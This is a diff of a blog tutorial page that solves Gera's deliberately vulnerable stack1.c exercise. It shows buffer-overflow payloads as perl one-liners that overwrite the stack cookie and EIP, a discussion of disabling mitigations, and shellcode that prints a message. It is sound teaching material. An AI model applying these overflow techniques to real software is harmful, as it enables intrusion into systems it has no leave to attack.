@@ -1,136 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <title>7h3rAm's Infosec Ramblings</title>
     <meta charset="utf-8"/>
-    <meta content="7h3rAm" name="author"/>
+    <meta name="author" content="7h3rAm"/>
+    <meta name="description" content="Personal Weblog"/>
     <meta content="width=device-width, initial-scale=1" name="viewport"/>
-
-    <script src="/static/js/jquery/jquery-1.10.2.js"></script>
-    <link href="/static/css/bootstrap/bootstrap.3.3.6.min.css" rel="stylesheet" type="text/css">
-    <link href="/static/css/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-    <link href="/static/css/morrisjs/morris.css" rel="stylesheet" type="text/css">
-    <link href="/static/css/timeline/timeline.css" rel="stylesheet" type="text/css">
+    <title>Grey Matter</title>
     <link href="/static/css/main.css" rel="stylesheet" type="text/css">
     <link href="/static/css/codehilite/zenburn.css" rel="stylesheet" type="text/css">
-    <link href="/static/images/favicon.ico" rel="icon" type="image/x-icon"/>
-
-    <!-- Google Analytics -->
-    <script>
-    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-    ga('create', 'UA-50288765-1', '7h3rAm.github.io');
-    ga('send', 'pageview');
-    </script>
-    <script async src='http://www.google-analytics.com/analytics.js'></script>
-    <!-- End Google Analytics -->
-
+    <link href="/static/images/favicon-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
   </head>
-  <body id="index" class="home">
-    <header class="header">
-      <nav>
-        <ul>
-          <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
-          <li><a href="/archive.html"><i class="fa fa-archive"></i> Archive</a></li>
-          <li><a href="/tags.html"><i class="fa fa-tags"></i> Tags</a></li>
-          <li><a href="/dashboard.html"><i class="fa fa-bar-chart"></i> Dashboard</a></li>
-          <li><a href="/research.html"><i class="fa fa-list-alt"></i> Research</a></li>
-        </ul>
-      </nav>
-    </header>
+  <body>
     <section id="content" class="body">
-      
-  
-  
-  <article class="post">
+              <div class="header">
+          <table>
+            <tr>
+              <td class="blogtitle"><a href="/">Grey Matter</a></td>
+              <td class="blognavbar">
+                <a href="/archive.html">[Archive]</a> <a href="/tags.html">[Tags]</a> <a href="/research.html">[Research]</a></a>
+              </td>
+            </tr>
+          </table>
+        </div>
+                  <article class="post">
   <div class="row">
     <div class="col-lg-12">
-      <div class="panel panel-default">
-        <div class="panel-heading post-title">
-          Gera's Warming Up on Stack #1 - Solutions
-        </div>
-        <div class="panel-body">
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-              
-                
-                
-              
-              
-                
-                
-              
-              
-                <p class="post-date">
-                  <a href="/2012/exploit-mitigation-techniques-on-linux.html"><i class="fa fa-angle-double-left"></i></a> published on August 27, 2012<a href="/2012/word-list-builder-dic-file-parsing-seh.html"> <i class="fa fa-angle-double-right"></i></a><br/>
-                  readtime: 57 minutes and 29 seconds (view <a href="https://raw.githubusercontent.io/7h3rAm/7h3rAm.github.io/master/_posts/geras-wuos-stack1-solutions.md">source</a>)
+      <div class="panel panel-default section compact">
+        <div class="body">
+          <p class="heading">Gera's Warming Up on Stack #1 - Solutions</p>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <p class="date">
+                  <a href="/2012/exploit-mitigation-techniques-on-linux.html">&lt&lt;</a> published on 2012 Aug 27<a href="/2012/word-list-builder-dic-file-parsing-seh.html"> &gt;&gt;</i></a><br/>
                 </p>
-              
-            
-          
-            
-          
-        <div class="post-summary">Solutions for Gera's Warming up on Stack #1 program.</div>
-        <div class="post-content">
+                                                                  <div class="post-content">
           <p>This is the part 1 in a series of posts that aim to provide an
 analysis and possible solutions for the vulnerable programs provided by
 Gera at his Insecure Programming by example page.</p>
@@ -154,7 +55,7 @@ their absence affects exploitation reliability.</p>
 <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a>
 program:</p>
 
-<div class="codehilite"><pre><code><span class="cm">/* stack1.c                                     *</span>
+<div class="codehilite"><pre><span></span><code><span class="cm">/* stack1.c                                     *</span>
 <span class="cm"> * specially crafted to feed your brain by gera */</span>
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
@@ -254,19 +155,19 @@ below listed ideas:</p>
 <p>All right! Let&#8217;s start with the test execution of this program. Here&#8217;s a
 brief description of the test system:</p>
 
-<div class="codehilite"><pre><code><span class="c"># cat /etc/lsb-release | grep DESC</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># cat /etc/lsb-release | grep DESC</span>
 <span class="nv">DISTRIB_DESCRIPTION</span><span class="o">=</span><span class="s2">&quot;Ubuntu 9.04&quot;</span>
-<span class="c">#</span>
-<span class="c"># uname -a | cut -d&quot; &quot; -f1,3,12,13</span>
-Linux 2.6.28-19-generic i686 GNU/Linux
-<span class="c">#</span>
-<span class="c"># gcc --version | grep gcc</span>
-gcc <span class="o">(</span>Ubuntu 4.3.3-5ubuntu4<span class="o">)</span> 4.3.3
-<span class="c">#</span>
-<span class="c"># cat /proc/cpuinfo | grep -E &#39;(vendor|model|flags)&#39;</span>
+<span class="c1">#</span>
+<span class="c1"># uname -a | cut -d&quot; &quot; -f1,3,12,13</span>
+Linux <span class="m">2</span>.6.28-19-generic i686 GNU/Linux
+<span class="c1">#</span>
+<span class="c1"># gcc --version | grep gcc</span>
+gcc <span class="o">(</span>Ubuntu <span class="m">4</span>.3.3-5ubuntu4<span class="o">)</span> <span class="m">4</span>.3.3
+<span class="c1">#</span>
+<span class="c1"># cat /proc/cpuinfo | grep -E &#39;(vendor|model|flags)&#39;</span>
 vendor_id : GenuineIntel
-model   : 60
-model name  : Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i5-4200M CPU @ 2.50GHz
+model   : <span class="m">60</span>
+model name  : Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i5-4200M CPU @ <span class="m">2</span>.50GHz
 flags   : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx rdtscp lm constant_tsc up xtopology pni pclmulqdq monitor ssse3 cx16 sse4_1 sse4_2 aes xsave avx lahf_lm abm
 </code></pre></div>
 
@@ -274,10 +175,10 @@ flags   : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse3
 <code>-mpreferred-stack-boundary=2</code> option is used to align stack entries at
 QWORD (8B) boundary:</p>
 
-<div class="codehilite"><pre><code><span class="c"># gcc -mpreferred-stack-boundary=2 -o stack1 stack1.c</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># gcc -mpreferred-stack-boundary=2 -o stack1 stack1.c</span>
 stack1.c: In <span class="k">function</span> ‘main’:
 stack1.c:8: warning: incompatible implicit declaration of built-in <span class="k">function</span> ‘printf’
-stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">2</span> has <span class="nb">type</span> ‘char <span class="o">(</span>*<span class="o">)[</span>80<span class="o">]</span>’
+stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">2</span> has <span class="nb">type</span> ‘char <span class="o">(</span>*<span class="o">)[</span><span class="m">80</span><span class="o">]</span>’
 stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">3</span> has <span class="nb">type</span> ‘int *’
 /tmp/ccaqTuRT.o: In <span class="k">function</span> <span class="sb">`</span>main<span class="s1">&#39;:</span>
 <span class="s1">stack1.c:(.text+`0x32`): warning: the `gets&#39;</span> <span class="k">function</span> is dangerous and should not be used.
@@ -294,7 +195,7 @@ command-line uses the objdump utility to dump the disassembled object
 code of a program in <a href="http://asm.sourceforge.net/articles/linasm.html#Syntax">Intel</a> syntax (remove the <code>-Mintel</code> option from the
 below command-line to view AT&amp;T syntax formatted assembled code):</p>
 
-<div class="codehilite"><pre><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A30</span> <span class="nv">main.</span><span class="p">:</span>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A30</span> <span class="nv">main.</span><span class="p">:</span>
 <span class="err">08048484</span> <span class="err">&lt;</span><span class="nf">main</span><span class="o">&gt;</span><span class="p">:</span>
  <span class="err">8048484:</span> <span class="err">55</span>                    <span class="nf">push</span>   <span class="nb">ebp</span>
  <span class="err">8048485:</span> <span class="err">89</span> <span class="nf">e5</span>                 <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
@@ -359,7 +260,7 @@ an overview of the security features implemented within the Linux
 kernel, ELF binaries and executing processes on a system. Here is a
 listing of its available options:</p>
 
-<div class="codehilite"><pre><code><span class="nv">$ </span>./checksec.sh
+<div class="codehilite"><pre><span></span><code>$ ./checksec.sh
 Usage: checksec <span class="o">[</span>OPTION<span class="o">]</span>
 
 Options:
@@ -383,7 +284,7 @@ For more information, see:
 try the <code>--kernel</code> option to see available mitigation features
 implemented within the kernel on the test system:</p>
 
-<div class="codehilite"><pre><code><span class="c"># ./checksec.sh --kernel</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># ./checksec.sh --kernel</span>
 * Kernel protection information:
 
   Description - List the status of kernel protection mechanisms. Rather than
@@ -397,7 +298,7 @@ implemented within the kernel on the test system:</p>
 
   GCC stack protector support:            Disabled
   Strict user copy checks:                Disabled
-  Enforce <span class="nb">read</span>-only kernel data:          Enabled
+  Enforce read-only kernel data:          Enabled
   Restrict /dev/mem access:               Enabled
   Restrict /dev/kmem access:              Enabled
 
@@ -416,10 +317,10 @@ implemented within the kernel on the test system:</p>
 enabled and we have already seen it in action earlier. Let&#8217;s now see
 what does this script has to say about the <code>stack1</code> ELF binary:</p>
 
-<div class="codehilite"><pre><code><span class="c"># ./checksec.sh --file stack1</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># ./checksec.sh --file stack1</span>
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   stack1
-<span class="c"># ./checksec.sh --fortify-file stack1</span>
+<span class="c1"># ./checksec.sh --fortify-file stack1</span>
 * FORTIFY_SOURCE support available <span class="o">(</span>libc<span class="o">)</span>    : Yes
 * Binary compiled with FORTIFY_SOURCE support: Yes
 
@@ -433,11 +334,11 @@ Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RU
 
 SUMMARY:
 
-* Number of checked functions in libc                : 74
-* Total number of library functions in the executable: 53
-* Number of FORTIFY-able functions in the executable : 4
-* Number of checked functions in the executable      : 0
-* Number of unchecked functions in the executable    : 4
+* Number of checked functions in libc                : <span class="m">74</span>
+* Total number of library functions in the executable: <span class="m">53</span>
+* Number of FORTIFY-able functions in the executable : <span class="m">4</span>
+* Number of checked functions in the executable      : <span class="m">0</span>
+* Number of unchecked functions in the executable    : <span class="m">4</span>
 </code></pre></div>
 
 <p>As discussed earlier, the default compilation command-line enabled quite
@@ -461,7 +362,7 @@ between. While overwriting EIP, it will also be overwritten and the
 <code>__stack_chk_fail</code> function would terminate the program before the
 message is printed:</p>
 
-<div class="codehilite"><pre><code><span class="c"># perl -e &#39;print &quot;A&quot;x81&#39; | ./stack1</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;A&quot;x81&#39; | ./stack1</span>
 buf: bfb94544 cookie: bfb94540
 *** stack smashing detected ***: ./stack1 <span class="nv">terminated</span>
 <span class="o">=======</span> Backtrace: <span class="o">=========</span>
@@ -471,25 +372,25 @@ buf: bfb94544 cookie: bfb94540
 /lib/tls/i686/cmov/libc.so.6<span class="o">(</span>__libc_start_main+<span class="sb">`</span>0xe5<span class="o">)[</span>0xb7<span class="sb">`</span>6bb775<span class="o">]</span>
 ./stack1<span class="o">[</span><span class="sb">`</span>0x80483f1<span class="o">]</span><span class="sb">`</span>
 <span class="o">=======</span> Memory map: <span class="o">========</span>
-08048000-08049000 r-xp <span class="m">00000000</span> 08:01 <span class="m">9352</span>       /home/seed/Documents/stack1
-08049000-0804a000 r--p <span class="m">00000000</span> 08:01 <span class="m">9352</span>       /home/seed/Documents/stack1
-0804a000-0804b000 rw-p <span class="m">00001000</span> 08:01 <span class="m">9352</span>       /home/seed/Documents/stack1
-09724000-09745000 rw-p <span class="m">09724000</span> 00:00 <span class="m">0</span>          <span class="o">[</span>heap<span class="o">]</span>
-b7687000-b7694000 r-xp <span class="m">00000000</span> 08:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
-b7694000-b7695000 r--p 0000c000 08:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
-b7695000-b7696000 rw-p 0000d000 08:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
-b76a4000-b76a5000 rw-p b76a4000 00:00 0
-b76a5000-b7801000 r-xp <span class="m">00000000</span> 08:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
-b7801000-b7802000 ---p 0015c000 08:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
-b7802000-b7804000 r--p 0015c000 08:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
-b7804000-b7805000 rw-p 0015e000 08:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
-b7805000-b7808000 rw-p b7805000 00:00 0
-b7814000-b7818000 rw-p b7814000 00:00 0
-b7818000-b7819000 r-xp b7818000 00:00 <span class="m">0</span>          <span class="o">[</span>vdso<span class="o">]</span>
-b7819000-b7835000 r-xp <span class="m">00000000</span> 08:01 <span class="m">280519</span>     /lib/ld-2.9.so
-b7835000-b7836000 r--p 0001b000 08:01 <span class="m">280519</span>     /lib/ld-2.9.so
-b7836000-b7837000 rw-p 0001c000 08:01 <span class="m">280519</span>     /lib/ld-2.9.so
-bfb81000-bfb96000 rw-p bffea000 00:00 <span class="m">0</span>          <span class="o">[</span>stack<span class="o">]</span>
+<span class="m">08048000</span>-08049000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">9352</span>       /home/seed/Documents/stack1
+<span class="m">08049000</span>-0804a000 r--p <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">9352</span>       /home/seed/Documents/stack1
+0804a000-0804b000 rw-p <span class="m">00001000</span> <span class="m">08</span>:01 <span class="m">9352</span>       /home/seed/Documents/stack1
+<span class="m">09724000</span>-09745000 rw-p <span class="m">09724000</span> <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>heap<span class="o">]</span>
+b7687000-b7694000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
+b7694000-b7695000 r--p 0000c000 <span class="m">08</span>:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
+b7695000-b7696000 rw-p 0000d000 <span class="m">08</span>:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
+b76a4000-b76a5000 rw-p b76a4000 <span class="m">00</span>:00 <span class="m">0</span>
+b76a5000-b7801000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
+b7801000-b7802000 ---p 0015c000 <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
+b7802000-b7804000 r--p 0015c000 <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
+b7804000-b7805000 rw-p 0015e000 <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
+b7805000-b7808000 rw-p b7805000 <span class="m">00</span>:00 <span class="m">0</span>
+b7814000-b7818000 rw-p b7814000 <span class="m">00</span>:00 <span class="m">0</span>
+b7818000-b7819000 r-xp b7818000 <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>vdso<span class="o">]</span>
+b7819000-b7835000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">280519</span>     /lib/ld-2.9.so
+b7835000-b7836000 r--p 0001b000 <span class="m">08</span>:01 <span class="m">280519</span>     /lib/ld-2.9.so
+b7836000-b7837000 rw-p 0001c000 <span class="m">08</span>:01 <span class="m">280519</span>     /lib/ld-2.9.so
+bfb81000-bfb96000 rw-p bffea000 <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>stack<span class="o">]</span>
 Aborted
 </code></pre></div>
 
@@ -506,19 +407,19 @@ playground for our exploit attempts. Additionally, we see how the
 <code>checksec.sh</code> script correctly identifies the absence of stack canary
 and fortify source mitigation features from the program:</p>
 
-<div class="codehilite"><pre><code><span class="c"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack1 stack1.c</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack1 stack1.c</span>
 stack1.c: In <span class="k">function</span> ‘main’:
 stack1.c:8: warning: incompatible implicit declaration of built-in <span class="k">function</span> ‘printf’
-stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">2</span> has <span class="nb">type</span> ‘char <span class="o">(</span>*<span class="o">)[</span>80<span class="o">]</span>’
+stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">2</span> has <span class="nb">type</span> ‘char <span class="o">(</span>*<span class="o">)[</span><span class="m">80</span><span class="o">]</span>’
 stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">3</span> has <span class="nb">type</span> ‘int *’
 /tmp/ccOI8wdo.o: In <span class="k">function</span> <span class="sb">`</span>main<span class="s1">&#39;:</span>
 <span class="s1">stack1.c:(.text+`0x27): war`ning: the `gets&#39;</span> <span class="k">function</span> is dangerous and should not be used.
-<span class="c">#</span>
-<span class="c"># ./checksec.sh --file stack1</span>
+<span class="c1">#</span>
+<span class="c1"># ./checksec.sh --file stack1</span>
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   stack1
-<span class="c">#</span>
-<span class="c"># perl -e &#39;print &quot;A&quot;x81&#39; | ./stack1</span>
+<span class="c1">#</span>
+<span class="c1"># perl -e &#39;print &quot;A&quot;x81&#39; | ./stack1</span>
 buf: bfbb8bf4 cookie: bfbb8c44
 </code></pre></div>
 
@@ -527,7 +428,7 @@ have been ordered as per our expectation. Let&#8217;s have a peek at the
 program assembly to quickly see if the stack cookie has also been added
 or not:</p>
 
-<div class="codehilite"><pre><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A20</span> <span class="nv">main.</span><span class="p">:</span>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A20</span> <span class="nv">main.</span><span class="p">:</span>
 <span class="err">08048424</span> <span class="err">&lt;</span><span class="nf">main</span><span class="o">&gt;</span><span class="p">:</span>
  <span class="err">8048424:</span> <span class="err">55</span>                    <span class="nf">push</span>   <span class="nb">ebp</span>
  <span class="err">8048425:</span> <span class="err">89</span> <span class="nf">e5</span>                 <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
@@ -558,12 +459,12 @@ or not:</p>
 <p>For this solution we first need to calculate the offset between <code>buf</code>
 and <code>cookie</code>:</p>
 
-<div class="codehilite"><pre><code><span class="c"># ./stack1</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># ./stack1</span>
 buf: bfad87b4 cookie: bfad8804
 AAAAAAA
 
-<span class="c"># printf &quot;offset: %d\n&quot; $((`0xbffff554` - `0xbffff504`))</span>
-offset: 80
+<span class="c1"># printf &quot;offset: %d\n&quot; $((`0xbffff554` - `0xbffff504`))</span>
+offset: <span class="m">80</span>
 </code></pre></div>
 
 <p>As expected, it came out to be 80B. We craft a perl command-line to
@@ -571,7 +472,7 @@ overwrite 80B of data to reach past the <code>buf</code> boundary. Once this is
 done, we&#8217;re pointing at the cookie, which can then be overwritten with
 the desired content:</p>
 
-<div class="codehilite"><pre><code><span class="c"># perl -e &#39;print &quot;A&quot;x80 . &quot;\x44\x43\x42\x41&quot;&#39; | ./stack1</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;A&quot;x80 . &quot;\x44\x43\x42\x41&quot;&#39; | ./stack1</span>
 buf: bfee2d14 cookie: bfee2d64
 you win!
 </code></pre></div>
@@ -587,7 +488,7 @@ transfers to stack1&#8217;s <code>.text</code> segment instead of the
 <code>__libc_start_main()</code>. But first we need to find the address of the
 <code>printf</code> statement from <code>stack1</code>&#8217;s assembly code:</p>
 
-<div class="codehilite"><pre><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A20</span> <span class="nv">main.</span><span class="p">:</span>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A20</span> <span class="nv">main.</span><span class="p">:</span>
 <span class="err">08048424</span> <span class="err">&lt;</span><span class="nf">main</span><span class="o">&gt;</span><span class="p">:</span>
  <span class="err">8048424:</span> <span class="err">55</span>                    <span class="nf">push</span>   <span class="nb">ebp</span>
  <span class="err">8048425:</span> <span class="err">89</span> <span class="nf">e5</span>                 <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
@@ -636,7 +537,7 @@ program. As such we could find out the offset of the EIP as well.</p>
 easily calculated. The <code>buf</code> 80B + cookie 4B + saved Frame Pointer 4B =
 88B. This is the offset of EIP from the start of the <code>buf</code> array:</p>
 
-<div class="codehilite"><pre><code><span class="c"># perl -e &#39;print &quot;A&quot;x88 . &quot;\x59\x84\x04\x08&quot;&#39; | ./stack1</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;A&quot;x88 . &quot;\x59\x84\x04\x08&quot;&#39; | ./stack1</span>
 buf: bfebf464 cookie: bfebf4b4
 you win!
 Segmentation fault
@@ -662,7 +563,7 @@ It tells that one of the mitigation features, <code>NX</code>, is enabled for th
 vulnerable <code>stack1</code> program. This means that when we execute this
 binary, it will have its stack segment marked as non-executable:</p>
 
-<div class="codehilite"><pre><code><span class="c"># readelf -l stack1 | grep -i gnu_stack</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># readelf -l stack1 | grep -i gnu_stack</span>
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
 </code></pre></div>
 
@@ -680,16 +581,16 @@ then read on and try to think about why this might be happening.</p>
 <p>First we need to design a shellcode that simulates the <code>puts</code> call. I
 came up with the following:</p>
 
-<div class="codehilite"><pre><code><span class="c"># cat -n printf.s</span>
-     <span class="m">1</span>  <span class="c"># printf.s</span>
-     <span class="m">2</span>  <span class="c"># sample program to print &quot;you win!\n&quot; message to stdout</span>
-     3
+<div class="codehilite"><pre><span></span><code><span class="c1"># cat -n printf.s</span>
+     <span class="m">1</span>  <span class="c1"># printf.s</span>
+     <span class="m">2</span>  <span class="c1"># sample program to print &quot;you win!\n&quot; message to stdout</span>
+     <span class="m">3</span>
      <span class="m">4</span>  .section .text
      <span class="m">5</span>  .globl _start
-     6
+     <span class="m">6</span>
      <span class="m">7</span>  _start:
      <span class="m">8</span>    jmp cali
-     9
+     <span class="m">9</span>
     <span class="m">10</span>  init:
     <span class="m">11</span>    xorl %eax, %eax
     <span class="m">12</span>    xorl %ebx, %ebx
@@ -698,19 +599,19 @@ came up with the following:</p>
     <span class="m">15</span>    mov <span class="nv">$1</span>, %bl
     <span class="m">16</span>    popl %ecx
     <span class="m">17</span>    mov <span class="nv">$9</span>, %dl
-    <span class="m">18</span>    int <span class="nv">$0x80</span>
-    19
+    <span class="m">18</span>    int <span class="nv">$0</span>x80
+    <span class="m">19</span>
     <span class="m">20</span>    xorl %eax, %eax
     <span class="m">21</span>    incl %eax
     <span class="m">22</span>    xorl %ebx, %ebx
-    <span class="m">23</span>    int <span class="nv">$0x80</span>
-    24
+    <span class="m">23</span>    int <span class="nv">$0</span>x80
+    <span class="m">24</span>
     <span class="m">25</span>  cali:
     <span class="m">26</span>    call init
-    27
+    <span class="m">27</span>
     <span class="m">28</span>  msg:
     <span class="m">29</span>    .ascii <span class="s2">&quot;you win!\n&quot;</span>
-    30
+    <span class="m">30</span>
 </code></pre></div>
 
 <p>The above code uses the standard Linux system calls, <code>write</code> and <code>exit</code>,
@@ -721,15 +622,15 @@ shellcode writing tricks to remove NULL bytes from our shellcode,
 reducing its size and overcoming the addressing problem. Assemble and
 link the program to create a standalone binary:</p>
 
-<div class="codehilite"><pre><code><span class="c"># as -o printf.o printf.s</span>
-<span class="c"># ld -o printf printf.o</span>
-<span class="c"># ./printf</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># as -o printf.o printf.s</span>
+<span class="c1"># ld -o printf printf.o</span>
+<span class="c1"># ./printf</span>
 you win!
 </code></pre></div>
 
 <p>Here is the objdump for the resultant <code>printf</code> program:</p>
 
-<div class="codehilite"><pre><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">printf</span>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">printf</span>
 
 <span class="nl">printf:</span>     <span class="nf">file</span> <span class="nv">format</span> <span class="nv">elf32</span><span class="o">-</span><span class="nv">i386</span>
 
@@ -765,10 +666,10 @@ you win!
 
 <p>Extract opcodes to create the required shellcode and calculate its size:</p>
 
-<div class="codehilite"><pre><code><span class="c"># perl -e &#39;print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot;&#39; &gt;shellcode.bin</span>
-<span class="c">#</span>
-<span class="c"># ls -lh shellcode.bin</span>
--rw-r--r-- <span class="m">1</span> seed seed <span class="m">38</span> 2012-08-27 02:41 shellcode.bin
+<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot;&#39; &gt;shellcode.bin</span>
+<span class="c1">#</span>
+<span class="c1"># ls -lh shellcode.bin</span>
+-rw-r--r-- <span class="m">1</span> seed seed <span class="m">38</span> <span class="m">2012</span>-08-27 <span class="m">02</span>:41 shellcode.bin
 </code></pre></div>
 
 <p>Now we are ready with the shellcode that simulates the <code>puts</code> call. Once
@@ -781,28 +682,28 @@ exploit. Why is this so? If you had noticed earlier, both <code>buf</code> and
 <code>cookie</code>, although adjacent and aligned as expected, had different
 address on each invocation:</p>
 
-<div class="codehilite"><pre><code><span class="c"># ./stack1</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># ./stack1</span>
 buf: bfc21614 cookie: bfc21664
 AAAA
-<span class="c">#</span>
-<span class="c"># ./stack1</span>
+<span class="c1">#</span>
+<span class="c1"># ./stack1</span>
 buf: bf9ad354 cookie: bf9ad3a4
 AAAA
-<span class="c">#</span>
-<span class="c"># ./stack1</span>
+<span class="c1">#</span>
+<span class="c1"># ./stack1</span>
 buf: bfd7c3d4 cookie: bfd7c424
 AAAA
-<span class="c">#</span>
+<span class="c1">#</span>
 </code></pre></div>
 
 <p>You would have already guessed by now. It is due to the <code>ASLR</code>
 mitigation feature that is active on the test system:</p>
 
-<div class="codehilite"><pre><code><span class="c"># cat /proc/sys/kernel/randomize_va_space</span>
-2
-<span class="c">#</span>
-<span class="c"># ./checksec.sh --proc init</span>
-* System-wide ASLR <span class="o">(</span>kernel.randomize_va_space<span class="o">)</span>: On <span class="o">(</span>Setting: 2<span class="o">)</span>
+<div class="codehilite"><pre><span></span><code><span class="c1"># cat /proc/sys/kernel/randomize_va_space</span>
+<span class="m">2</span>
+<span class="c1">#</span>
+<span class="c1"># ./checksec.sh --proc init</span>
